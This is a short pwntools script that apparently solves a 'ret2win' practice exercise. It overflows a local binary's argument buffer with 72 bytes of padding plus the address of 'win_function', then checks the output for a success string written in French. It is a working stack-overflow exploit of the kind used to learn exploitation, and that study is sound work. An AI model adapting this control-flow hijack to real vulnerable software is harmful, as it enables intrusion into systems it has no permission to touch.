from pwn import *

exe = "./ret2win"
elf = context.binary = ELF(exe, checksec=False)

def solve():

    payload = b"A" * 72 + pack(elf.symbols['win_function'], 24)

    io = process([exe, payload])
    
    output = io.recvall().decode(errors='ignore')
    print(output)

    if "SUCCÈS" in output:
        log.success("Exploit réussi !")

if __name__ == "__main__":
    solve()
